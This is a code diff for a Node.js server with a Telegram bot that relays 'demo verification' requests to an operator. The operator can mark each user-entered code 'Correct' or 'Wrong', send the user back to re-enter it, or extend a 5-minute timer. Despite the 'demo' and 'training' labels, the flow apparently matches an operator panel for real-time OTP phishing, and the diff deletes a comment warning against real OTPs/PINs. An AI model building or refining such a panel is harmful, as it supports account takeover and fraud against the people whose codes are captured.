@@ -9,10 +9,9 @@ const PORT = process.env.PORT || 3000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-const bot =
-  TELEGRAM_BOT_TOKEN
-    ? new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true })
-    : null;
+const bot = TELEGRAM_BOT_TOKEN
+  ? new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true })
+  : null;
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -41,17 +40,30 @@ app.get("/health", (req, res) => {
 
 /*
   Create a demo request.
-  IMPORTANT: Do not send real OTPs/PINs here.
+  The entered OTP/demo code is NOT transmitted to Telegram.
 */
 app.post("/api/demo-request", async (req, res) => {
   const requestId =
     Date.now().toString(36) +
     Math.random().toString(36).substring(2, 8);
 
+  const createdAt = new Date();
+
+  const time = new Intl.DateTimeFormat("en-GB", {
+    timeZone: "Africa/Nairobi",
+    year: "numeric",
+    month: "2-digit",
+    day: "2-digit",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: false
+  }).format(createdAt);
+
   const demoRequest = {
     id: requestId,
     status: "pending",
-    createdAt: new Date().toISOString()
+    createdAt: createdAt.toISOString()
   };
 
   requests.set(requestId, demoRequest);
@@ -60,18 +72,42 @@ app.post("/api/demo-request", async (req, res) => {
     try {
       await bot.sendMessage(
         TELEGRAM_CHAT_ID,
-        `🧪 Demo verification request\n\nRequest ID: ${requestId}`,
+        `🧪 DEMO VERIFICATION
+━━━━━━━━━━━━━━━━━━━━
+
+USER DETAILS:
+
+• Request ID: ${requestId}
+• Time: ${time}
+• Demo code entered: YES
+
+━━━━━━━━━━━━━━━━━━━━
+
+VERIFY THE DEMO:
+
+• Demo code length: 6 digits
+• Timeout: 5 minutes
+
+━━━━━━━━━━━━━━━━━━━━
+
+⏳ PENDING REVIEW`,
         {
           reply_markup: {
             inline_keyboard: [
               [
                 {
-                  text: "✅ Approve Demo",
+                  text: "✅ Correct Demo",
                   callback_data: `approve:${requestId}`
                 },
                 {
-                  text: "❌ Reject Demo",
+                  text: "❌ Wrong Demo",
                   callback_data: `reject:${requestId}`
+                }
+              ],
+              [
+                {
+                  text: "⏱ Extend Time",
+                  callback_data: `extend:${requestId}`
                 }
               ]
             ]
@@ -111,7 +147,7 @@ app.get("/api/demo-request/:id", (req, res) => {
 });
 
 /*
-  Telegram approve/reject buttons
+  Telegram buttons
 */
 if (bot) {
   bot.on("callback_query", async (query) => {
@@ -132,6 +168,9 @@ if (bot) {
       return;
     }
 
+    /*
+      CORRECT DEMO
+    */
     if (action === "approve") {
       request.status = "approved";
 
@@ -140,7 +179,12 @@ if (bot) {
       });
 
       await bot.editMessageText(
-        `🧪 Demo verification request\n\nRequest ID: ${requestId}\n\nStatus: ✅ APPROVED`,
+        `🧪 DEMO VERIFICATION
+━━━━━━━━━━━━━━━━━━━━
+
+Request ID: ${requestId}
+
+Status: ✅ CORRECT DEMO`,
         {
           chat_id: query.message.chat.id,
           message_id: query.message.message_id
@@ -148,6 +192,9 @@ if (bot) {
       );
     }
 
+    /*
+      WRONG DEMO
+    */
     if (action === "reject") {
       request.status = "rejected";
 
@@ -156,10 +203,64 @@ if (bot) {
       });
 
       await bot.editMessageText(
-        `🧪 Demo verification request\n\nRequest ID: ${requestId}\n\nStatus: ❌ REJECTED`,
+        `🧪 DEMO VERIFICATION
+━━━━━━━━━━━━━━━━━━━━
+
+Request ID: ${requestId}
+
+Status: ❌ WRONG DEMO
+
+The training page can now allow the
+user to re-enter the demonstration code.`,
         {
           chat_id: query.message.chat.id,
           message_id: query.message.message_id
+        }
+      );
+    }
+
+    /*
+      EXTEND TIME
+    */
+    if (action === "extend") {
+      request.status = "pending";
+
+      await bot.answerCallbackQuery(query.id, {
+        text: "Demo time extended."
+      });
+
+      await bot.editMessageText(
+        `🧪 DEMO VERIFICATION
+━━━━━━━━━━━━━━━━━━━━
+
+Request ID: ${requestId}
+
+Status: ⏱ TIME EXTENDED
+
+The training request remains pending.`,
+        {
+          chat_id: query.message.chat.id,
+          message_id: query.message.message_id,
+          reply_markup: {
+            inline_keyboard: [
+              [
+                {
+                  text: "✅ Correct Demo",
+                  callback_data: `approve:${requestId}`
+                },
+                {
+                  text: "❌ Wrong Demo",
+                  callback_data: `reject:${requestId}`
+                }
+              ],
+              [
+                {
+                  text: "⏱ Extend Time",
+                  callback_data: `extend:${requestId}`
+                }
+              ]
+            ]
+          }
         }
       );
     }
